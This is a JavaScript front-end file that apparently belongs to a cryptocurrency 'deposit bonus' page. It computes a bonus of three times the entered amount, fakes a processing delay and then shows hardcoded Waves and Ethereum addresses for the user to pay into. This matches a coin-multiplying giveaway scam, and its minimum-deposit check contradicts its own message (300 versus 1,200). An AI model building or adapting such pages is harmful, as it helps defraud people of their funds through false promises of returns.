const amount = document.getElementById("amount");
const amount2 = document.getElementById("amount2");
const bonus = document.getElementById("bonus");
const address = document.getElementById("address");
const generate = document.getElementById("generate");
const paymentDiv = document.getElementById("paymentDiv");
const roll = document.getElementById("roll");
const circle1 = document.querySelector("#circle1 div");
const circle2 = document.querySelector("#circle2 div");
const net1 = document.querySelector("#net1");
const net2 = document.querySelector("#net2");
const qrimg = document.querySelector("#qrimg");
const qrimg2 = document.querySelector("#qrimg2");
const myInput = document.querySelector("#myInput");


const address1 = "3PNMJoQe2K7AzbgUUJUGhn6Y9KjHgZLWsz3";
const address2 = "0xe720f277a6641CA06e10846998E644E75BdF43f4";
circle1.style.visibility = "visible";

net1.addEventListener("click", evt => {
    circle1.style.visibility = "visible";
    circle2.style.visibility = "hidden";
    qrimg.style.visibility = "visible";
    qrimg2.style.visibility = "hidden";
    myInput.value = address1;
});

net2.addEventListener("click", evt => {
    circle1.style.visibility = "hidden";
    circle2.style.visibility = "visible";
    qrimg.style.visibility = "hidden";
    qrimg2.style.visibility = "visible";
    myInput.value = address2;
});

amount.addEventListener("input", evt => {
    bonus.value = evt.target.value * 3;
    amount2.value = evt.target.value;
    paymentDiv.style.display = "none";
    generate.style.display = "block";
});

bonus.addEventListener("input", evt => {
    amount.value = evt.target.value / 3;
    amount2.value = evt.target.value / 3;
    paymentDiv.style.display = "none";
    generate.style.display = "block";
});

generate.addEventListener("click", evt => {
    amount.style.border = "none";
    address.style.border = "none";
    if(!amount.value || !bonus.value){
        alert("Please enter amount!");
        amount.style.border = "1px solid red";
        return false;
    }
    if(amount.value < 300){
        alert("Deposit a minimum of 1,200 waves");
        amount.style.border = "1px solid red";
        return false;
    }
    if(amount.value > 200000){
        alert("Deposit a maximum of 200,000 waves");
        amount.style.border = "1px solid red";
        return false;
    }
    if(!address.value || address.value.length < 35){
        alert("Please enter a valid waves address!");
        address.style.border = "1px solid red";
        return false;
    }
    roll.style.display = "inline-block"
    setTimeout(()=> {
        paymentDiv.style.display = "block";
        generate.style.display = "none";
        roll.style.display = "none";
    },1000);
}); 

function myFunction() {
    var copyText = document.getElementById("myInput");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);
    
    var tooltip = document.getElementById("myTooltip");
    tooltip.innerHTML = "Copied: " ;
  }
  
  function outFunc() {
    var tooltip = document.getElementById("myTooltip");
    tooltip.innerHTML = "Copy to clipboard";
  }

